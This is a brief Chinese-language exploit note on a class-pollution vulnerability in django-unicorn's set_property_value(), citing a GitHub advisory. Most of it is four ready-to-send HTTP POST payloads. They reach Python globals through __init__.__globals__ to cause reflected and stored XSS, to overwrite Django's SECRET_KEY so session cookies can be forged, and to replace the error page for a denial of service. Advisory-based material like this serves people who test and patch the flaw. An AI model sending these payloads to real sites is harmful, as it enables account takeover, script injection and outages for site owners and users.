https://github.com/advisories/GHSA-g9wf-5777-gq43
tpl:
django-unicorn

vul func:
set_property_value()（位于 django_unicorn/views/action_parsers/utils.py）


漏洞触发条件
攻击者可构造恶意 HTTP 请求，控制 property_name（点分路径）和 property_value（任意值）。
利用魔法属性（如 __globals__） 遍历 Python 运行时环境，污染全局对象。
目标系统使用 Django-Unicorn 且未升级到安全版本。

poc:
PoC 代码片段
1. 反射型 XSS（污染 bs4 HTML 转义规则）
Http
POST /unicorn/message/todo HTTP/1.1
{
  "actionQueue": [{
    "type": "syncInput",
    "payload": {
      "name": "__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<",
      "value": "<img/src=1 onerror=alert(1)>"
    }
  }],
  "data": {"task": ""}
}
效果：所有模板中的 < 字符会被替换为 XSS 载荷。

2. 存储型 XSS（绕过 Django JSON 转义）
Http
POST /unicorn/message/todo HTTP/1.1
{
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.utils.html._json_script_escapes",
        "value": {}  # 清空转义规则
      }
    },
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django_unicorn.settings.DEFAULT_MORPHER_NAME",
        "value": "</script><script>alert(1)</script>"
      }
    }
  ],
  "data": {"task": ""}
}
效果：存储的 JSON 数据不再转义，直接执行脚本。

3. 认证绕过（污染 Django SECRET_KEY）
Http
POST /unicorn/message/todo HTTP/1.1
{
  "actionQueue": [{
    "type": "syncInput",
    "payload": {
      "name": "__init__.__globals__.sys.modules.django.conf.settings.SECRET_KEY",
      "value": "attacker_controlled_key"
    }
  }],
  "data": {"task": ""}
}
效果：攻击者可伪造任意用户的会话 Cookie。

4. DoS（污染错误页面模板）
Http
POST /unicorn/message/todo HTTP/1.1
{
  "actionQueue": [{
    "type": "syncInput",
    "payload": {
      "name": "__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE",
      "value": "<html>Service Down</html>"
    }
  }],
  "data": {"task": ""}
}


